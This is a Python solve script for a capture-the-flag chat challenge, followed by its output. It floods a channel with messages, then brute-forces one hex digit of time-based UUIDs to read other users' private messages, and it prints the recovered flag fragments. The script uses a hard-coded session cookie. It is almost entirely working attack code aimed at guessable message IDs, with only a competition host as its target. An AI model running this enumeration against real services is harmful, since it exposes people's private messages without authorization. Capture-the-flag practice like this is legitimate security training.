#!/usr/bin/env python3
import requests
import json
import time

def addMsg():
    requests.post(f"{TARGET}/message", data={"to":CHANNEL_NAME,"message":"AAA"}, cookies=SESSION_COOKIES)
def getMsgsList():
    r = requests.post(f"{TARGET}/poll", data={"rooms":CHANNEL_NAME}, cookies=SESSION_COOKIES)
    return json.loads(r.text)[CHANNEL_NAME]
SESSION_COOKIES = {"session":"MTYyNzIwNjYyNHxEdi1CQkFFQ180SUFBUkFCRUFBQVFQLUNBQUVHYzNSeWFXNW5EQVFBQW1sa0JuTjBjbWx1Wnd3bUFDUmlZVE0wTjJNek5pMWxaREprTFRFeFpXSXRPR1kxTWkwMU1qUm1NMk5oWm1Gak5Uaz18Jj7jTRNKNusAXRw3-wB9hXILzHw4VBqjF-U5MifcbkQ="}
TARGET = "https://letschat-web.2021.ctfcompetition.com"
MSG_TARGET = "https://letschat-messages-web.2021.ctfcompetition.com/"
CHANNEL_NAME = "l3oroom"

for i in range(40):
    addMsg()
    time.sleep(1)
print("[+] Finish Adding Messages")
time.sleep(2)
msgs = getMsgsList()
print("[+] Start Bruteforcing")
for msg in msgs:
    for j in "0123456789abcdef":
        fuuid = msg[0:7]+j+msg[8:]
        r = requests.get(f"{MSG_TARGET}/{fuuid}")
        if("Cthon98" in r.text or "AzureDiamond" in r.text):
            print(fuuid)
            print(r.text)

"""
33ab1110-ed30-11eb-8f52-524f3cafac59
AzureDiamond:you can go FLAG_PART_2[your] my FLAG_PART_3[way]-ing FLAG_PART_4[to]
33ab1110-ed30-11eb-8f52-524f3cafac59
AzureDiamond:you can go FLAG_PART_2[your] my FLAG_PART_3[way]-ing FLAG_PART_4[to]
2e4dbf88-ed30-11eb-8f52-524f3cafac59
Cthon98:thats what I see
2e4dbf88-ed30-11eb-8f52-524f3cafac59
Cthon98:thats what I see
2c841c93-ed30-11eb-8f52-524f3cafac59
Cthon98:AzureDiamond *******
2c841c93-ed30-11eb-8f52-524f3cafac59
Cthon98:AzureDiamond *******
2aba5cd4-ed30-11eb-8f52-524f3cafac59
AzureDiamond:doesnt look like stars to me
2aba5cd4-ed30-11eb-8f52-524f3cafac59
AzureDiamond:doesnt look like stars to me
28f07a96-ed30-11eb-8f52-524f3cafac59
AzureDiamond:FLAG_PART_1[ctf{chat]
2726bd94-ed30-11eb-8f52-524f3cafac59
Cthon98:********* see!
2726bd94-ed30-11eb-8f52-524f3cafac59
Cthon98:********* see!
255d0d51-ed30-11eb-8f52-524f3cafac59
Cthon98:hey, if you type in your pw, it will show as stars
255d0d51-ed30-11eb-8f52-524f3cafac59
Cthon98:hey, if you type in your pw, it will show as stars
1e35eba5-ed30-11eb-8f52-524f3cafac59
AzureDiamond:awesome!
1e35eba5-ed30-11eb-8f52-524f3cafac59
AzureDiamond:awesome!
05791953-ed2f-11eb-8f52-524f3cafac59
AzureDiamond:haha, does that look funny to you?
05791953-ed2f-11eb-8f52-524f3cafac59
AzureDiamond:haha, does that look funny to you?
05791953-ed2f-11eb-8f52-524f3cafac59
AzureDiamond:haha, does that look funny to you?
05791953-ed2f-11eb-8f52-524f3cafac59
AzureDiamond:haha, does that look funny to you?
2d1ba2f8-ed2e-11eb-8f52-524f3cafac59
Cthon98:Absolutely
2d1ba2f8-ed2e-11eb-8f52-524f3cafac59
Cthon98:Absolutely
29882940-ed2e-11eb-8f52-524f3cafac59
Cthon98:thats what I see
29882940-ed2e-11eb-8f52-524f3cafac59
Cthon98:thats what I see
29882940-ed2e-11eb-8f52-524f3cafac59
Cthon98:thats what I see
29882940-ed2e-11eb-8f52-524f3cafac59
Cthon98:thats what I see
25f49375-ed2e-11eb-8f52-524f3cafac59
AzureDiamond:doesnt look like stars to me
e3cb4182-ed2d-11eb-8f52-524f3cafac59
Cthon98:hey, if you type in your pw, it will show as stars
...
...
"""